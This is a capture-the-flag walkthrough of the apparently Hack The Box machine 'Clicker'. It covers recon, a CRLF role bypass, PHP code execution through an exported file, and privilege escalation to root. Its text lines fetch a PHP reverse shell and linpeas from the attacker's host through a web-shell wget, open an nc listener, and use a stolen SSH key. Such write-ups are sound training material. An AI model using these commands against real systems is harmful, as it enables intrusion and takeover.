## Initial Foothold
Threader3000 output:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/d83bdf8f-3087-46af-946b-a0344f5eaa52)

nmap scan:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/d79217f2-b1fa-4899-9b3e-4083800ab551)

Mounting through rpcbind we get the source code to the website:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/a4d493c3-c315-4bd0-8961-19fb17aa2cfe)

Going to the http page, I see that clicker.htb is a hostname, so I put it in /etc/hosts:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/f3440627-79ea-4910-8c3d-eb57c8124ee5)

ffuf scan:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/2a60e4e1-06cc-405f-a9bb-d95f003467f9)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/93acf304-50df-4fcc-b61d-4cdf8500032b)
![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/0eb00477-1b1d-4b74-aaa9-4f53aef5cdc1)
![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/d8dc8649-b141-4ed7-815c-69a93f9ca79f)

Looking at save_game.php, we see that they are likely trying to prevent us from setting our "role" to admin:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/0601bdfb-aaad-4af3-ab3d-b12fdad1d0af)

CRLF (Carriage Return Line Feed) Bypass to get Admin on webapp:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/350ed58b-d660-4c8f-af7b-575b22f275ea)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/5a7bc25f-74ec-4a0d-ae18-cd59db2edba9)

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/5b4d2183-a6c5-4dda-a3f1-9f02e2d71865)

Setting payload in nickname field that will be displayed in the exported file:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/ee9b195d-20a2-46de-adf1-4d7f71d401bb)

Setting the exported file extension to .php so it can be executed:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/a4eb0281-5c97-4b6d-81f5-fcb2b8d15519)

RCE achieved:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/58cf322c-c3bf-4257-8597-78372fdca035)

Host a server with python locally and download the php reverse shell onto the target machine:
- https://github.com/ivan-sincek/php-reverse-shell
- python3 -m http.server 80
- http://clicker.htb/exports/top_players_hsyxecsn.php?cmd=wget%20http://10.10.14.13/flexibleshell.php

Listen and execute the rshell:
- rlwrap nc -nvlp 1234
- http://clicker.htb/exports/top_players_hsyxecsn.php?cmd=php%20flexibleshell.php
- ![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/cf60cc8f-313a-46a3-980c-c2bbf3b003d9)

## Privesc
stabilize shell:
- python3 -c "import pty;pty.spawn('/bin/sh')"
- ![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/25cb1630-f605-4662-8943-bc6e390989e4)
- ![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/88a83453-bbe3-4c31-a144-5d027fbc99dd)

download and execute linpeas:
- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- wget 10.10.14.13/linpeas.sh
- chmod +x linpeas.sh
- ./linpeas.sh
- ![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/fdaab627-91c0-483c-ba60-05818d1acea5)

There is a functionality in this SUID binary that allows us to read jack's private ssh key (the program is run inside jack's home directory):

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/3c5ca730-ecc1-4326-a932-dcd6d33656bb)

Copy/paste it over onto local machine into "id_rsa", and then run "ssh jack@clicker.htb -i id_rsa":

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/59b04f7e-32d7-4759-a9c6-940461bac970)


Checking out sudo permissions, we see /opt/monitor.sh which is a perl script allowing us to use an perl_startup privesc:
- ![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/57e5bfda-9ab9-472c-9b64-e5f3be8958e6)
- https://www.exploit-db.com/exploits/39702

Exploit to give bash an SUID bit and get root:

![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/5591564a-e3db-4930-818e-f307f2f5120f)

## What I learned
CRLF (Carriage Return Line Feed) Bypass, perl_startup privesc
